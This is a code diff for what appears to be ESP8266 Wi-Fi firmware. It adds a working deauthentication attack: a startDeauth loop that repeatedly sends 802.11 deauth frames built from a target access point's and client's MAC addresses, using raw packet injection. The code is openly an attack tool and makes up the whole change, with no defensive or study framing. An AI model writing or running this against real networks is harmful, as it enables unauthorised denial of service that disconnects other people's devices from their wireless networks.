@@ -130,3 +130,27 @@ void Attack::handleProbePacket(uint8_t *buff, uint16_t len)
         Serial.printf("Packet captured! Length: %d, Frame Control: 0x%04X\n", len, frameCtrl);
     }
 }
+
+void Attack::startDeauth(uint8_t bssid[6], uint8_t client_mac[6], int channel)
+{
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    wifi_set_channel(channel);
+    deauth.active = true;
+    Serial.printf("Starting deauth attack on channel %d...\n", channel);
+    while(deauth.active)
+    {
+        sendDeauthFrame(bssid, client_mac);
+        delay(2);
+        deauth.packetCounter++;
+    }
+}
+
+void Attack::sendDeauthFrame(uint8_t targetAPMAC[6], uint8_t targetClientMAC[6])
+{
+    memcpy(&deauth_packet[4], targetClientMAC, 6);
+    memcpy(&deauth_packet[10], targetAPMAC, 6);
+    memcpy(&deauth_packet[16], targetAPMAC, 6);
+
+    wifi_send_pkt_freedom(deauth_packet, sizeof(deauth_packet), 0);
+}
